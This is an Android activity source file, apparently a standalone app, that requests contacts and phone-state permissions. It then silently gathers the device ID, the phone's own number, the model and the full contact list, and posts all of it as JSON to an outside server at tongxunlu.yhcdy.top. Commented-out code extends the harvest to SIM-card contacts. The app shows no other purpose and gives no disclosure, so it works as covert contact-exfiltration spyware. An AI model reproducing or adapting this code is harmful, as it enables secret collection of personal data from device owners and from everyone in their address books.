package com.example.administrator.assdressphone;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {
    private Context context;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = this;
        setContentView(R.layout.activity_main);




        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, 101);
        } else {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{ Manifest.permission.READ_PHONE_STATE}, 102);
                return;
            }
            readPhone();
        }

    }

    private void readPhone() {

        //获取手机号码
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);


        @SuppressLint("MissingPermission") String deviceid = tm.getDeviceId();//获取智能设备唯一编号
        @SuppressLint("MissingPermission") String te1  = tm.getLine1Number();//获取本机号码
        String phonetype= android.os.Build.BRAND+Build.MODEL;
        BaseResultBean resultBean = new BaseResultBean();
        resultBean.setMobile(te1);
        resultBean.setIdentifier(deviceid);
        resultBean.setPhone_type(phonetype);
        resultBean.setName(phonetype);

        List<PhoneBean> phoneInfo = getPhoneInfo();
        resultBean.setData(phoneInfo);
        String s = new Gson().toJson(resultBean);
        Log.i("wch", s);
        OkGo.<String>post("http://tongxunlu.yhcdy.top/api/insert")
                .params("information", s)
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        Log.i("wch",response.body());
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                        Log.i("wch",response.body());

                    }
                });
    }

    public List<PhoneBean> getPhoneInfo() {



        List<PhoneBean> phoneBeans = new ArrayList<>();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
//指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = context.getContentResolver().
                query(uri, projection, null, null, null);

        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Long id = cursor.getLong(0);
                //获取姓名
                String name = cursor.getString(1);
                //指定获取NUMBER这一列数据
                String[] phoneProjection = new String[]{
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };

                //根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                        null,
                        null);

                //因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        String num = phonesCusor.getString(0);

                        PhoneBean contactsBean = new PhoneBean();
                        contactsBean.setName(name);
                        contactsBean.setMobile(formatPhoneNum(num));
//                        contactsBean.setNote("");

                        phoneBeans.add(contactsBean);


                    } while (phonesCusor.moveToNext());
                }
                i++;
            } while (cursor.moveToNext());
        }

//        // 获取sim卡的联系人--1
//        try {
//            getSimContact("content://icc/adn", phoneBeans);
//
//            getSimContact("content://icc/adn/subId/#", phoneBeans);
//
//            getSimContact("content://icc/sdn", phoneBeans);
//
//            getSimContact("content://icc/sdn/subId/#", phoneBeans);
//
//            getSimContact("content://icc/fdn", phoneBeans);
//
//            getSimContact("content://icc/fdn/subId/#", phoneBeans);
//
//        } catch (Exception e) {
//            Log.d("提现啦：", e.getLocalizedMessage());
//        }

        return phoneBeans;
    }


    private void getSimContact(String adn, List<PhoneBean> list) {
        // 读取SIM卡手机号,有三种可能:content://icc/adn || content://icc/sdn || content://icc/fdn
        // 具体查看类 IccProvider.java
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(adn);
            Log.e("wch",uri.toString());
            cursor = context.getContentResolver().query(uri, null,
                    null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    // 取得联系人名字
                    int nameIndex = cursor.getColumnIndex("name");
                    // 取得电话号码
                    int numberIndex = cursor.getColumnIndex("number");
                    String number = cursor.getString(numberIndex);// 手机号
                    Log.d("wch","手机号:" + number);

                        PhoneBean simCardTemp = new PhoneBean();
                        simCardTemp.setMobile(formatPhoneNum(number));
                        simCardTemp.setName(cursor.getString(nameIndex));
                        if (!list.contains(simCardTemp)) {
                            list.add(simCardTemp);
                        }

                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("wch",e.toString());
            if (cursor != null) {
                cursor.close();
            }
        }
    }
    /**
     * 去掉手机号内除数字外的所有字符
     *
     * @param phoneNum 手机号
     * @return
     */
    private String formatPhoneNum(String phoneNum) {
        String regex = "(\\+86)|[^0-9]";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(phoneNum);
        return matcher.replaceAll("");
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {


        switch (requestCode){
            case 101:
                if (grantResults.length > 0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){
                    ActivityCompat.requestPermissions(this, new String[]{ Manifest.permission.READ_PHONE_STATE}, 102);
                }else {
                    if (grantResults[0] == PackageManager.PERMISSION_DENIED) {

                        if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0])) {
                            PermissionUtils.setPermission(context);
                        }
                    }else {

                        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS},101);
                    }

                }
                break;

            case 102:
                if (grantResults.length > 0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){

                    readPhone();
                }else {
                    if (grantResults[0] == PackageManager.PERMISSION_DENIED) {

                        if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[0])) {
                            PermissionUtils.setPermission(context);
                        }
                    }else {

                        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_PHONE_STATE},101);
                    }

                }

                break;
        }
    }
}
